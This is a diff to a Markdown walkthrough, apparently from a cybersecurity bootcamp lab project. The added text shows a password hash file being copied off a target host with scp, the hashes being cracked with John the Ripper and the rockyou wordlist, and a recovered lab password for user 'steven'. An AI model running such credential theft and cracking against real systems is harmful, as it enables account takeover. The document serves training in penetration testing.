@@ -167,6 +167,20 @@ scp michael@192.168.1.110:/var/www/html/user_hash.txt
 ```
 ***scp command is a secure copy (remote file copy) and can be done either from the host or fromt the remote machine, in the step above we have done using it from the host machine.***
 
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/scp_from_michael_to_localhost.png)
+
+- Now we are ready to begin cracking the hashes using John the Ripper.
+
+***John the Ripper is a free password cracking software tool.
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hash.txt
+```
+![](https://github.com/pboonman196/Final_Project_CyberBootcamp/blob/main/Screenshot/using_john_to_crack.png)
+
+- Now we can crack the hashes of user steven, that has been identified as "pink84."
+
+-
       - _TODO: Identify the exploit used_
       
       - _TODO: Include the command run_
